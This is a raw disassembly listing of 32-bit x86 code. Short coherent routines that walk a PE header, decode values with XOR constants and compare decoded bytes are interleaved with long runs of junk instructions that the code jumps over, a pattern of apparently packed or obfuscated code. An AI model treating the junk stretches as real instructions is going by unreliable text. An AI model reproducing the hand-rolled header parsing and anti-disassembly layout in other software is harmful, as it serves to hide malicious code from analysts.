  40c46d:	cmp    DWORD PTR [ecx],eax
  40c46f:	je     0x40cb8c
  40c475:	mov    ecx,DWORD PTR [ebp-0x18]
  40c478:	mov    eax,DWORD PTR [ebp-0x8]
  40c47b:	mov    eax,DWORD PTR [eax]
  40c47d:	mov    eax,DWORD PTR [eax+0x3c]
  40c480:	lea    ecx,[ecx*8+0x78]
  40c487:	add    eax,ecx
  40c489:	jmp    0x40c7d6
  40c48e:	ffree  st(2)
  40c490:	les    esp,FWORD PTR ds:0xc2dd21e1
  40c496:	xchg   ebp,eax
  40c497:	(bad)  
  40c498:	sub    edx,DWORD PTR [edi+0x5d]
  40c49b:	xlat   BYTE PTR ds:[ebx]
  40c49c:	dec    edi
  40c49d:	sbb    DWORD PTR ss:[edi+0x7d2e7e7e],eax
  40c4a4:	jle    0x40c524
  40c4a6:	sbb    BYTE PTR [eax-0x61],ah
  40c4a9:	(bad)  
  40c4aa:	and    al,0xca
  40c4ac:	data16 stos BYTE PTR es:[edi],al
  40c4ae:	fdiv   st,st(6)
  40c4b0:	push   0xffffff9a
  40c4b2:	out    0xbe,al
  40c4b4:	mov    ecx,0x1f6e3153
  40c4b9:	and    DWORD PTR [eax+0x38],ebx
  40c4bc:	jmp    0x258daf2
  40c4c1:	and    BYTE PTR [edi],cl
  40c4c3:	jl     0x40c4de
  40c4c5:	pop    esi
  40c4c6:	inc    ecx
  40c4c7:	sub    eax,0x60022c70
  40c4cc:	jp     0x40c509
  40c4ce:	xchg   esp,eax
  40c4cf:	sbb    DWORD PTR [eax],ecx
  40c4d1:	mov    ebp,0x8c269495
  40c4d6:	inc    ebx
  40c4d7:	stos   BYTE PTR es:[edi],al
  40c4d8:	mov    ecx,0x686cf416
  40c4dd:	fimul  WORD PTR [esp+ecx*2]
  40c4e0:	cmp    al,0x60
  40c4e2:	jne    0x40c4a9
  40c4e4:	cmp    al,0xa5
  40c4e6:	icebp  
  40c4e7:	push   ebx
  40c4e8:	push   ds
  40c4e9:	lods   eax,DWORD PTR ds:[esi]
  40c4ea:	loope  0x40c515
  40c4ec:	fld    DWORD PTR [ecx+0x6a27c5f0]
  40c4f2:	das    
  40c4f3:	sub    bl,dh
  40c4f5:	les    esp,FWORD PTR [edi-0x2f]
  40c4f8:	jle    0x40c558
  40c4fa:	add    ebx,eax
  40c4fc:	jl     0x40c534
  40c4fe:	ins    BYTE PTR es:[edi],dx
  40c4ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c500:	mov    gs,WORD PTR [edi]
  40c502:	mov    esp,0x6754ad4e
  40c507:	mov    eax,ds:0x802afc31
  40c50c:	mov    ecx,0x80dfbac6
  40c511:	hlt    
  40c512:	(bad)  
  40c513:	fbstp  TBYTE PTR [ecx+0x2ac21723]
  40c519:	jno    0x40c514
  40c51b:	or     DWORD PTR [ecx+edi*1],0xffffffc4
  40c51f:	pop    ebx
  40c520:	push   cs
  40c521:	cmc    
  40c522:	push   edi
  40c523:	ror    BYTE PTR gs:[esi],cl
  40c526:	mov    edi,0x321b7cfb
  40c52b:	jge    0x40c59a
  40c52d:	ds push esp
  40c52f:	pop    ebx
  40c530:	sbb    DWORD PTR [ebx-0x34],ebx
  40c533:	nop
  40c534:	dec    ecx
  40c535:	cmp    al,0x6
  40c537:	shr    BYTE PTR [edx],0x79
  40c53a:	repnz sti 
  40c53c:	fcomp  QWORD PTR [edx-0x37]
  40c53f:	or     ebx,esi
  40c541:	mov    al,ds:0x3f7b571b
  40c546:	or     edi,DWORD PTR [ebx+0x68d86017]
  40c54c:	mov    edx,0x10c0e35
  40c551:	nop
  40c552:	sbb    DWORD PTR ds:0x668c3256,eax
  40c558:	jmp    0x723a:0xf6fd99e8
  40c55f:	sub    DWORD PTR [ecx],esi
  40c561:	in     al,dx
  40c562:	xchg   esi,eax
  40c563:	cmp    BYTE PTR [eax+0x4420229b],dl
  40c569:	mov    BYTE PTR [edi-0x21],dl
  40c56c:	sub    BYTE PTR [ebx],ch
  40c56e:	call   0x4cff:0x6935bb8f
  40c575:	or     al,BYTE PTR [eax+0x70]
  40c578:	lds    esi,FWORD PTR [ecx+0x65]
  40c57b:	push   eax
  40c57c:	into   
  40c57d:	xchg   ebp,eax
  40c57e:	add    eax,0x6108e172
  40c583:	int3   
  40c584:	or     esi,esp
  40c586:	retf   
  40c587:	in     eax,dx
  40c588:	mov    dl,0x85
  40c58a:	sbb    BYTE PTR [ebx+0x42],0x3c
  40c58e:	mov    edx,0x426caf0f
  40c593:	idiv   DWORD PTR [eax+ecx*1-0x284b9b54]
  40c59a:	mul    ebp
  40c59c:	out    dx,eax
  40c59d:	push   edx
  40c59e:	xor    dh,al
  40c5a0:	jns    0x40c5ba
  40c5a2:	std    
  40c5a3:	test   eax,0x712d1766
  40c5a8:	jmp    0x40c5a0
  40c5aa:	mov    dh,0x52
  40c5ac:	retf   0x5437
  40c5af:	in     al,dx
  40c5b0:	ins    DWORD PTR es:[edi],dx
  40c5b1:	repnz (bad) 
  40c5b4:	jae    0x40c5c1
  40c5b6:	lock xchg ebx,eax
  40c5b8:	or     al,0x2f
  40c5ba:	mov    ch,0x7a
  40c5bc:	fld    TBYTE PTR [ebp+ebp*4-0x44473967]
  40c5c3:	leave  
  40c5c4:	mov    ecx,0x3aa2e2b3
  40c5c9:	inc    ebp
  40c5ca:	xlat   BYTE PTR ds:[ebx]
  40c5cb:	inc    esi
  40c5cc:	pop    esi
  40c5cd:	test   BYTE PTR [edi],bh
  40c5cf:	fstp   TBYTE PTR [eax-0x54]
  40c5d2:	and    al,0xed
  40c5d4:	add    al,0x59
  40c5d6:	or     esi,DWORD PTR [edx+0x2fcf8454]
  40c5dc:	dec    ecx
  40c5dd:	xchg   esp,eax
  40c5de:	aas    
  40c5df:	push   esi
  40c5e0:	xchg   ebx,eax
  40c5e1:	rol    BYTE PTR [eax],cl
  40c5e3:	fld    DWORD PTR [edi+ebx*1+0x180b42a7]
  40c5ea:	ret    0xcf33
  40c5ed:	aam    0x98
  40c5ef:	sub    edi,DWORD PTR ds:0xc3ebac2e
  40c5f5:	mov    ecx,0x5fb7a011
  40c5fa:	or     ebp,DWORD PTR [ebx+0x52]
  40c5fd:	xor    al,BYTE PTR [ebp+esi*4-0x16]
  40c601:	jecxz  0x40c615
  40c603:	in     eax,0x5e
  40c605:	mov    eax,ds:0xde274ed3
  40c60a:	mov    dh,0xda
  40c60c:	(bad)  
  40c60d:	mov    dh,dl
  40c60f:	cmp    eax,edi
  40c611:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c612:	mov    ebx,0x123d14c3
  40c617:	ins    DWORD PTR es:[edi],dx
  40c618:	mov    edx,0xd89e915f
  40c61d:	sub    dl,BYTE PTR [eax-0x31]
  40c620:	outs   dx,DWORD PTR ds:[esi]
  40c621:	stc    
  40c622:	test   al,0xb8
  40c624:	mov    eax,ds:0xcff90b50
  40c629:	push   ecx
  40c62a:	push   edi
  40c62b:	jnp    0x40c5b3
  40c62d:	ficom  DWORD PTR [ecx+0x32c3ad5d]
  40c633:	imul   esp,DWORD PTR [eax-0x5fe7303c],0x41c5fa09
  40c63d:	jnp    0x40c6ba
  40c63f:	add    DWORD PTR [edx],esp
  40c641:	(bad)  
  40c642:	lahf   
  40c643:	or     eax,DWORD PTR [ebp+0x3d]
  40c646:	cli    
  40c647:	xor    DWORD PTR [eax],edi
  40c649:	inc    ecx
  40c64a:	pushf  
  40c64b:	pop    ebx
  40c64c:	hlt    
  40c64d:	and    BYTE PTR ds:0xdf008bf1,bh
  40c653:	shr    DWORD PTR [ebp-0x36653e8],cl
  40c659:	mov    dh,0x28
  40c65b:	jbe    0x40c65a
  40c65d:	push   ds
  40c65e:	lods   eax,DWORD PTR ds:[esi]
  40c65f:	scas   al,BYTE PTR es:[edi]
  40c660:	mov    eax,0x3b6d7e6e
  40c665:	imul   ebx,DWORD PTR [ecx-0x74],0x75
  40c669:	imul   edi,DWORD PTR [ecx+0x4b9408b7],0xc3138e53
  40c673:	cmp    ebx,DWORD PTR gs:[esi+0x5a0a52d8]
  40c67a:	out    0x6,al
  40c67c:	xlat   BYTE PTR ds:[ebx]
  40c67d:	gs pushfw 
  40c680:	repnz int 0x89
  40c683:	adc    BYTE PTR [ebp+0x3f1bce65],cl
  40c689:	pop    ebx
  40c68a:	stos   BYTE PTR es:[edi],al
  40c68b:	sbb    ch,ch
  40c68d:	stos   BYTE PTR es:[edi],al
  40c68e:	repnz imul edx,DWORD PTR [esi+0x7e],0x6b88b9b7
  40c696:	xlat   BYTE PTR ds:[ebx]
  40c697:	lea    ebx,[ebx-0x72c33335]
  40c69d:	push   cs
  40c69e:	and    al,0xc7
  40c6a0:	out    0x82,al
  40c6a2:	das    
  40c6a3:	test   al,0xa6
  40c6a5:	inc    edi
  40c6a6:	leave  
  40c6a7:	sub    dl,ah
  40c6a9:	cdq    
  40c6aa:	mov    ecx,fs
  40c6ac:	fptan  
  40c6ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6af:	jo     0x40c6ab
  40c6b1:	nop
  40c6b2:	out    0xa9,al
  40c6b4:	mov    esi,0x8e233e05
  40c6b9:	sbb    BYTE PTR [edx-0x482277e1],dl
  40c6bf:	ins    BYTE PTR es:[edi],dx
  40c6c0:	cmp    ch,0x41
  40c6c3:	(bad)  
  40c6c4:	outs   dx,DWORD PTR ds:[esi]
  40c6c5:	pop    es
  40c6c6:	hlt    
  40c6c7:	loope  0x40c698
  40c6c9:	xor    ebx,DWORD PTR [ecx+0x77]
  40c6cc:	jge    0x40c73c
  40c6ce:	cmc    
  40c6cf:	jnp    0x40c6a7
  40c6d1:	shl    edx,cl
  40c6d3:	dec    ecx
  40c6d4:	jnp    0x40c712
  40c6d6:	outs   dx,DWORD PTR ds:[esi]
  40c6d7:	mov    bh,0x2a
  40c6d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6da:	or     eax,0xf8525aec
  40c6df:	mov    ds:0x1a05ebda,al
  40c6e4:	and    BYTE PTR [ebx+0x7f],0xec
  40c6e8:	imul   ecx,edx,0xe5978394
  40c6ee:	jbe    0x40c72a
  40c6f0:	mov    al,0x39
  40c6f2:	pop    ds
  40c6f3:	into   
  40c6f4:	call   0xe5b22daf
  40c6f9:	mov    edx,0xf8d77b32
  40c6fe:	add    DWORD PTR [ebx+0x1db12945],ebx
  40c704:	cmp    eax,0x480ca055
  40c709:	and    esi,esp
  40c70b:	cmp    eax,0x88552ecd
  40c710:	push   ebx
  40c711:	enter  0x7838,0x61
  40c715:	inc    ebp
  40c716:	fld    TBYTE PTR [esi-0x4dec420a]
  40c71c:	or     eax,0xc3784c5f
  40c721:	adc    DWORD PTR ds:0x2974707d,ebx
  40c727:	push   ecx
  40c728:	aam    0xcd
  40c72a:	arpl   WORD PTR [eax+0x70cb803a],sp
  40c730:	push   cs
  40c731:	(bad)  
  40c732:	adc    BYTE PTR [eax-0x4b169ef9],al
  40c738:	cmc    
  40c739:	(bad)  [ecx+edx*2+0x42]
  40c73e:	js     0x40c796
  40c740:	pop    esp
  40c741:	loop   0x40c7be
  40c743:	mov    cl,0x16
  40c745:	in     al,0xf4
  40c747:	dec    ebp
  40c748:	add    esi,eax
  40c74a:	cdq    
  40c74b:	(bad)  
  40c74c:	idiv   bh
  40c74e:	ror    BYTE PTR [ebp-0x32],0xe1
  40c752:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c753:	mov    dh,0x9
  40c755:	enter  0x7965,0xae
  40c759:	fdiv   QWORD PTR [ebx-0x177570b3]
  40c75f:	ins    DWORD PTR es:[edi],dx
  40c760:	inc    esp
  40c761:	push   esp
  40c762:	push   edi
  40c763:	(bad)  
  40c764:	retf   0xc1d3
  40c767:	inc    esp
  40c768:	into   
  40c769:	xchg   ebx,eax
  40c76a:	mov    edx,0x49555a44
  40c76f:	adc    edi,DWORD PTR [esp+edi*2+0x53]
  40c773:	pusha  
  40c774:	dec    esp
  40c775:	iret   
  40c776:	jmp    0x40c758
  40c778:	jae    0x40c7bd
  40c77a:	icebp  
  40c77b:	fist   WORD PTR [ecx-0x10]
  40c77e:	aaa    
  40c77f:	mov    edx,0x920713d3
  40c784:	jnp    0x40c788
  40c786:	out    dx,al
  40c787:	push   edi
  40c788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c789:	mov    ds:0xda5b004a,al
  40c78e:	shr    ecx,cl
  40c790:	rcr    BYTE PTR [eax-0x4f],0x3c
  40c794:	inc    esi
  40c795:	sub    DWORD PTR [edi+0x43],0x1
  40c799:	xchg   esi,eax
  40c79a:	cdq    
  40c79b:	popf   
  40c79c:	or     eax,0x555473cd
  40c7a1:	jmp    0x9adc:0x4edddff1
  40c7a8:	(bad)  
  40c7a9:	xor    esp,DWORD PTR [ecx+edi*8+0x55]
  40c7ad:	not    DWORD PTR [edx-0x1b44da3f]
  40c7b3:	jge    0x40c762
  40c7b5:	pop    ebp
  40c7b6:	adc    eax,DWORD PTR [edx+0x1c]
  40c7b9:	(bad)  
  40c7ba:	ins    DWORD PTR es:[edi],dx
  40c7bb:	das    
  40c7bc:	repnz xor ecx,DWORD PTR [edx+0x216f696b]
  40c7c3:	push   ss
  40c7c4:	test   eax,0x5f4ba23c
  40c7c9:	ins    BYTE PTR es:[edi],dx
  40c7ca:	inc    edi
  40c7cb:	pop    es
  40c7cc:	pushf  
  40c7cd:	dec    ecx
  40c7ce:	inc    ebp
  40c7cf:	dec    edi
  40c7d0:	stos   DWORD PTR es:[edi],eax
  40c7d1:	js     0x40c7dc
  40c7d3:	jno    0x40c80c
  40c7d5:	out    dx,eax
  40c7d6:	mov    ecx,DWORD PTR [ebp-0x8]
  40c7d9:	mov    ecx,DWORD PTR [ecx]
  40c7db:	mov    eax,DWORD PTR [eax+ecx*1]
  40c7de:	mov    DWORD PTR [ebp-0x20],eax
  40c7e1:	mov    eax,DWORD PTR [ebp+0x8]
  40c7e4:	xor    eax,esi
  40c7e6:	add    eax,edi
  40c7e8:	mov    DWORD PTR [ebp-0x24],eax
  40c7eb:	mov    eax,DWORD PTR [ebp+0x8]
  40c7ee:	jmp    0x40cb3b
  40c7f3:	mov    ecx,0xbd47bdf8
  40c7f8:	inc    ebx
  40c7f9:	inc    ecx
  40c7fa:	or     BYTE PTR [eax],0xac
  40c7fd:	data16 (bad) 
  40c7ff:	jb     0x40c7d0
  40c801:	in     al,0xc7
  40c803:	leave  
  40c804:	cmp    BYTE PTR [esi+0x7e],0x2e
  40c808:	jge    0x40c888
  40c80a:	jle    0x40c841
  40c80c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c80d:	fild   QWORD PTR ds:0x12c13e1e
  40c813:	sbb    DWORD PTR [esp+ecx*2],edx
  40c816:	loop   0x40c79d
  40c818:	inc    esp
  40c819:	cmc    
  40c81a:	jge    0x40c7d4
  40c81c:	cld    
  40c81d:	xchg   edx,eax
  40c81e:	loope  0x40c824
  40c820:	inc    edx
  40c821:	dec    edi
  40c822:	mov    al,ds:0xfce1cc9
  40c827:	test   eax,0x94810138
  40c82c:	jecxz  0x40c7ff
  40c82e:	pop    ebx
  40c82f:	sbb    DWORD PTR [edi+0x6ea6ff2c],eax
  40c835:	js     0x40c896
  40c837:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c838:	out    0x5b,al
  40c83a:	inc    ebp
  40c83b:	adc    bl,ch
  40c83d:	dec    edi
  40c83e:	repz mov ah,0x19
  40c841:	cwde   
  40c842:	push   0xffffff9a
  40c844:	xchg   edx,eax
  40c845:	push   ds
  40c846:	fdivp  st(2),st
  40c848:	cli    
  40c849:	enter  0x29df,0xa4
  40c84d:	nop
  40c84e:	mov    cl,0xe
  40c850:	xchg   esp,eax
  40c851:	xchg   esi,eax
  40c852:	pop    es
  40c853:	loope  0x40c7dd
  40c855:	bound  edx,QWORD PTR [ebx]
  40c857:	xchg   ebp,eax
  40c858:	cs jnp 0x40c89e
  40c85b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c85c:	mov    cl,0xd4
  40c85e:	jmp    0x3a0cc345
  40c863:	(bad)  
  40c864:	or     eax,0xbb513872
  40c869:	jge    0x40c8d8
  40c86b:	cwde   
  40c86c:	jbe    0x40c8b0
  40c86e:	xchg   esi,eax
  40c870:	mov    eax,0xa864c44f
  40c875:	dec    ebp
  40c876:	pop    ecx
  40c877:	and    ebx,ecx
  40c879:	adc    cl,BYTE PTR [ecx-0x72]
  40c87c:	mov    ecx,0xa591fb60
  40c881:	lds    esi,FWORD PTR [edi+eax*2+0x1742678b]
  40c888:	lahf   
  40c889:	mov    dh,0x9b
  40c88b:	xchg   BYTE PTR [ebx],dl
  40c88d:	ss add al,0x49
  40c890:	or     ah,BYTE PTR [ebp-0x4b]
  40c893:	or     esp,DWORD PTR [eax]
  40c895:	mov    al,ds:0x4ee83b84
  40c89a:	sti    
  40c89b:	and    DWORD PTR [eax+edi*4-0x5acb3df5],edi
  40c8a2:	dec    ebp
  40c8a3:	mov    cl,0xaf
  40c8a5:	hlt    
  40c8a6:	or     BYTE PTR [ebx],dl
  40c8a8:	xchg   esp,eax
  40c8a9:	call   0x452d:0xd92e92b6
  40c8b0:	scas   al,BYTE PTR es:[edi]
  40c8b1:	stos   DWORD PTR es:[edi],eax
  40c8b2:	jle    0x40c931
  40c8b4:	add    al,0x2b
  40c8b6:	(bad)  
  40c8b7:	in     al,dx
  40c8b8:	das    
  40c8b9:	je     0x40c8b5
  40c8bb:	repnz dec ebx
  40c8bd:	cmp    dh,BYTE PTR [ecx+ebx*8-0x21]
  40c8c1:	or     al,0xf0
  40c8c3:	cmp    DWORD PTR [eax+0x568ec314],ebx
  40c8c9:	arpl   WORD PTR [esi+0x7b],di
  40c8cc:	adc    DWORD PTR [ebx-0x4b],edx
  40c8cf:	icebp  
  40c8d0:	dec    esp
  40c8d1:	dec    ecx
  40c8d2:	cmp    dh,cl
  40c8d4:	loop   0x40c950
  40c8d6:	mov    ch,0x8d
  40c8d8:	push   cs
  40c8d9:	outs   dx,BYTE PTR ds:[esi]
  40c8da:	pop    ebp
  40c8db:	mov    WORD PTR [ebp-0x3ddb4b5],fs
  40c8e1:	sub    ch,BYTE PTR [eax-0xe]
  40c8e4:	(bad)  
  40c8e5:	adc    eax,0x46bff5c
  40c8ea:	adc    eax,0xe6a781ce
  40c8ef:	pop    eax
  40c8f0:	fisub  DWORD PTR [eax]
  40c8f2:	ret    
  40c8f3:	xor    eax,edx
  40c8f5:	repnz pop ebp
  40c8f7:	jp     0x40c947
  40c8f9:	jecxz  0x40c922
  40c8fb:	shl    BYTE PTR [eax+eiz*2],0x89
  40c8ff:	mov    esp,0xe8d8b62f
  40c904:	adc    DWORD PTR [edx+0x5a],ebx
  40c907:	dec    edx
  40c908:	jo     0x40c924
  40c90a:	nop
  40c90b:	mov    dl,0x6e
  40c90d:	cli    
  40c90e:	es out 0xb3,eax
  40c911:	imul   DWORD PTR [ebx+0xc]
  40c914:	popa   
  40c915:	ss mov esp,0x5497c785
  40c91b:	adc    ch,BYTE PTR [ebp+0x71]
  40c91e:	push   ds
  40c91f:	or     eax,0x46383900
  40c924:	shl    al,cl
  40c926:	xor    ebp,edi
  40c928:	adc    dh,ah
  40c92a:	xchg   edi,eax
  40c92b:	and    ecx,edx
  40c92d:	shr    BYTE PTR [ebp+0x71],0xa6
  40c931:	push   eax
  40c932:	mov    ecx,0xe41a7840
  40c937:	sub    edx,DWORD PTR ds:0xd12debce
  40c93d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c93e:	nop
  40c93f:	cmp    edi,DWORD PTR [edi+0x26]
  40c942:	je     0x40c947
  40c944:	or     al,0xc4
  40c946:	cwde   
  40c947:	sub    DWORD PTR [esi-0x5e1f093e],esi
  40c94d:	out    0xc2,eax
  40c94f:	mov    ch,0xc2
  40c951:	lock cmp eax,edx
  40c954:	sub    eax,0x188ae45f
  40c959:	add    al,dl
  40c95b:	sub    dh,BYTE PTR [edi-0x2df282cc]
  40c961:	and    bh,BYTE PTR [ebx+0xf]
  40c964:	inc    esp
  40c965:	and    al,0xf0
  40c967:	xor    edx,ecx
  40c969:	ss out 0x87,eax
  40c96c:	and    eax,0xb7ec3b1e
  40c972:	or     al,0x51
  40c974:	sub    cl,BYTE PTR [ebx-0x5f]
  40c977:	jbe    0x40c90e
  40c979:	daa    
  40c97a:	sub    esp,ebx
  40c97c:	into   
  40c97d:	mov    ebp,0x3d0b157c
  40c983:	icebp  
  40c984:	retf   
  40c985:	imul   edi,DWORD PTR ds:0x99ebc1e2,0x14661132
  40c98f:	push   ss
  40c990:	mov    edi,0x55d0bba4
  40c995:	jle    0x40c939
  40c997:	jmp    0x7de6f270
  40c99c:	cmp    BYTE PTR [eax+0x6bfba749],al
  40c9a2:	mov    ds:0xf0866155,eax
  40c9a7:	popf   
  40c9a8:	mov    ebp,0x6fc5239
  40c9ad:	xor    al,0x34
  40c9af:	in     eax,dx
  40c9b0:	sar    ecx,cl
  40c9b2:	or     esi,DWORD PTR [esi-0x6f64beff]
  40c9b8:	and    BYTE PTR [edi],0xa6
  40c9bb:	ja     0x40c957
  40c9bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9be:	outs   dx,BYTE PTR ds:[esi]
  40c9bf:	or     al,0xb2
  40c9c1:	test   DWORD PTR [edi],ebx
  40c9c3:	icebp  
  40c9c4:	push   0xaacb1c6c
  40c9c9:	std    
  40c9ca:	mov    edx,0x46006999
  40c9d0:	mov    edi,ds
  40c9d2:	retf   
  40c9d3:	mov    cl,0x7c
  40c9d5:	cdq    
  40c9d6:	cmp    BYTE PTR [eax-0x737ecd90],0xdf
  40c9dd:	jmp    0xd25f:0xeb9d2c3d
  40c9e4:	cmp    BYTE PTR [eax-0x74],dl
  40c9e7:	cmp    bl,BYTE PTR [edx+0x1c]
  40c9ea:	rcr    edi,cl
  40c9ec:	dec    esp
  40c9ed:	iret   
  40c9ee:	ja     0xb574dc2c
  40c9f4:	mov    ah,BYTE PTR [ebx]
  40c9f6:	and    eax,0xb93806ed
  40c9fb:	mov    dh,0xf6
  40c9fd:	jle    0x40c9f0
  40c9ff:	test   DWORD PTR [eax+0x7b],esi
  40ca02:	xor    DWORD PTR [ebp-0xf],0xffffff9e
  40ca06:	inc    edx
  40ca07:	dec    edi
  40ca08:	pop    es
  40ca09:	mov    ecx,gs
  40ca0b:	mov    esi,0x7b25bd6d
  40ca10:	daa    
  40ca11:	mov    ch,0x84
  40ca13:	sbb    al,BYTE PTR ss:[ecx]
  40ca16:	push   esp
  40ca17:	out    dx,eax
  40ca18:	into   
  40ca19:	cld    
  40ca1a:	(bad)  
  40ca1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca1c:	mov    gs,WORD PTR [ebp-0x1b609aab]
  40ca22:	mov    edi,0x10354703
  40ca27:	mov    al,0x3f
  40ca29:	xchg   DWORD PTR [ebx-0x38],eax
  40ca2c:	test   DWORD PTR [ebx],0x16bbc456
  40ca32:	enter  0x4019,0x3a
  40ca36:	js     0x40ca94
  40ca38:	xor    eax,0x10b3813e
  40ca3d:	pop    ss
  40ca3e:	mov    eax,0x6e6a19ea
  40ca43:	pushf  
  40ca44:	or     al,0x1b
  40ca46:	jmp    0x71f74470
  40ca4b:	adc    cl,BYTE PTR [eax+ebp*2-0x7b]
  40ca4f:	push   es
  40ca50:	sub    cl,BYTE PTR [edx-0x3a]
  40ca53:	gs test eax,0x70be2946
  40ca59:	outs   dx,BYTE PTR ds:[esi]
  40ca5a:	out    0x4c,eax
  40ca5c:	push   esp
  40ca5d:	sti    
  40ca5e:	jo     0x40c9ed
  40ca60:	int3   
  40ca61:	cmp    esi,DWORD PTR [edi+0x20]
  40ca64:	push   ss
  40ca65:	scas   al,BYTE PTR es:[edi]
  40ca66:	or     eax,0x9b86b605
  40ca6b:	jl     0x40ca36
  40ca6d:	mov    eax,ds:0xe6dcd75
  40ca72:	popa   
  40ca73:	xor    BYTE PTR [edi-0x12f53694],0x70
  40ca7a:	dec    edx
  40ca7b:	retf   0x68d4
  40ca7e:	push   esp
  40ca7f:	mov    edx,0x712ad1f0
  40ca84:	mov    ah,0x8
  40ca86:	stc    
  40ca87:	adc    bh,BYTE PTR [edx]
  40ca89:	mov    bl,0xda
  40ca8b:	std    
  40ca8c:	fisttp WORD PTR [ecx]
  40ca8e:	sub    DWORD PTR [edx-0x791330d3],eax
  40ca94:	xor    edi,DWORD PTR [edx]
  40ca96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca97:	pop    ds
  40ca98:	jl     0x40cac0
  40ca9a:	inc    edi
  40ca9b:	ffree  st(5)
  40ca9d:	scas   al,BYTE PTR es:[edi]
  40ca9e:	dec    eax
  40ca9f:	gs dec esp
  40caa1:	arpl   WORD PTR [ecx],bp
  40caa3:	ret    
  40caa4:	jg     0x40cac4
  40caa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40caa7:	maskmovq mm2,(bad)
  40caa8:	not    DWORD PTR [eax+0xc50043c]
  40caae:	rcr    BYTE PTR [eax],cl
  40cab0:	xchg   edi,eax
  40cab1:	cdq    
  40cab2:	pop    edi
  40cab3:	xor    cl,BYTE PTR [edx+0x37441af0]
  40cab9:	push   ebx
  40caba:	push   esi
  40cabb:	fs pop edi
  40cabd:	inc    esi
  40cabe:	mov    al,ds:0x3e993ef5
  40cac3:	inc    edi
  40cac4:	xchg   ebp,eax
  40cac5:	pop    ebp
  40cac6:	nop
  40cac7:	sti    
  40cac8:	jns    0x40cb3c
  40caca:	icebp  
  40cacb:	jge    0x40cb24
  40cacd:	fistp  QWORD PTR [ebx-0x4f]
  40cad0:	adc    eax,0x33e36ed
  40cad5:	push   ecx
  40cad6:	fsub   st,st(1)
  40cad8:	fsubr  st(6),st
  40cada:	mov    bh,0xb
  40cadc:	int    0x2f
  40cade:	(bad)  
  40cadf:	fistp  DWORD PTR [eax]
  40cae1:	lds    esi,FWORD PTR [edx+0x67]
  40cae4:	pop    ss
  40cae5:	inc    ebx
  40cae6:	lods   al,BYTE PTR ds:[esi]
  40cae7:	pop    eax
  40cae8:	pop    ebp
  40cae9:	ret    
  40caea:	hlt    
  40caeb:	jno    0x40cb2c
  40caed:	shr    BYTE PTR [edi],cl
  40caef:	jl     0x40cb3d
  40caf1:	ret    
  40caf2:	sub    al,0x8f
  40caf4:	adc    al,0x8e
  40caf6:	adc    al,0x1f
  40caf8:	adc    DWORD PTR [esi],edi
  40cafa:	shl    ecx,1
  40cafc:	xchg   ebp,eax
  40cafd:	adc    BYTE PTR [eax],bh
  40caff:	ret    0xdff6
  40cb02:	sub    eax,0xffffffa4
  40cb05:	imul   esp,DWORD PTR ds:0x7a1f3fcc,0xc9d2068b
  40cb0f:	add    ah,BYTE PTR [ebp-0x22137de1]
  40cb15:	jl     0x40cae4
  40cb17:	lock cmp DWORD PTR [edi-0xfcd78c5],edx
  40cb1e:	cmp    esi,ebp
  40cb20:	dec    ecx
  40cb21:	push   cs
  40cb22:	mov    al,ds:0xa242e435
  40cb27:	repnz push cs
  40cb29:	dec    ecx
  40cb2a:	int    0x50
  40cb2c:	or     esi,DWORD PTR [edi]
  40cb2e:	xor    al,0x1b
  40cb30:	mov    al,ds:0x68a4cdf2
  40cb35:	mov    eax,DWORD PTR [esi+eiz*1-0x74720dc2]
  40cb3c:	dec    ebp
  40cb3d:	loopne 0x40cb72
  40cb3f:	mov    BYTE PTR [ebx],0xc7
  40cb42:	cmp    ecx,eax
  40cb44:	je     0x40cba4
  40cb4a:	mov    eax,DWORD PTR [ebp-0x8]
  40cb4d:	mov    ecx,DWORD PTR [ebp-0x20]
  40cb50:	add    ecx,DWORD PTR [eax]
  40cb52:	mov    DWORD PTR [ebp-0x24],ecx
  40cb55:	mov    eax,DWORD PTR [ebp-0x24]
  40cb58:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb5b:	mov    eax,DWORD PTR [eax+0xc]
  40cb5e:	mov    ecx,DWORD PTR [ecx]
  40cb60:	mov    al,BYTE PTR [eax+ecx*1]
  40cb63:	add    al,0x38
  40cb65:	xor    al,0x46
  40cb67:	cmp    al,0xc5
  40cb69:	je     0x40cb80
  40cb6f:	mov    eax,DWORD PTR [ebp+0x8]
  40cb72:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb75:	xor    eax,esi
  40cb77:	add    eax,edi
  40cb79:	mov    DWORD PTR [ecx],eax
  40cb7b:	jmp    0x40cba4
  40cb80:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40cb87:	jmp    0x40cba4
  40cb8c:	mov    eax,DWORD PTR [ebp-0x8]
  40cb8f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40cb92:	mov    ecx,DWORD PTR [ecx]
  40cb94:	mov    DWORD PTR [eax],ecx
  40cb96:	mov    eax,DWORD PTR [ebp+0xc]
  40cb99:	mov    eax,DWORD PTR [ebp+0x8]
  40cb9c:	push   DWORD PTR [ebp-0x8]
  40cb9f:	call   0x401000
  40cba4:	mov    eax,DWORD PTR [ebp-0xc]
  40cba7:	cmp    eax,ebx
  40cba9:	je     0x40b333
  40cbaf:	mov    eax,DWORD PTR [ebp-0x8]
  40cbb2:	mov    eax,DWORD PTR [eax]
  40cbb4:	pop    edi
  40cbb5:	pop    esi
  40cbb6:	pop    ebx
  40cbb7:	leave  
  40cbb8:	ret    0x8
  40cbbb:	push   ebp
  40cbbc:	mov    ebp,esp
  40cbbe:	push   ecx
  40cbbf:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cbc6:	and    DWORD PTR ds:0x4302d5,0x0
  40cbd0:	jmp    0x40cbe0
